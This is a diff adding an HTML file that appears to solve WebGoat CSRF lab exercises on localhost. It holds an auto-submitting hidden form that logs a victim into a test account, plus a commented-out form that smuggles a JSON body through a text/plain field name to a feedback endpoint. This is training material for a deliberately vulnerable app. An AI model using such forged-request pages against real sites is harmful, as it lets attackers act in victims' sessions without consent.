@@ -1,0 +1,11 @@
+<form name="form" action="http://127.0.0.1:8080/WebGoat/login" method="POST">
+    <input type="hidden" name="username" value="csrf-test-user">
+    <input type="hidden" name="password" value="test-user">
+</form>
+<script>document.form.submit()</script>
+
+<!-- <form name="attack" enctype="text/plain" action="http://127.0.0.1:8080/WebGoat/csrf/feedback/message" method="POST">
+    <input type="hidden"
+        name='{"name": "Test", "email": "test1233@dfssdf.de", "subject": "service", "message":"dsaffd"}'>
+</form>
+<script>document.attack.submit();</script> -->
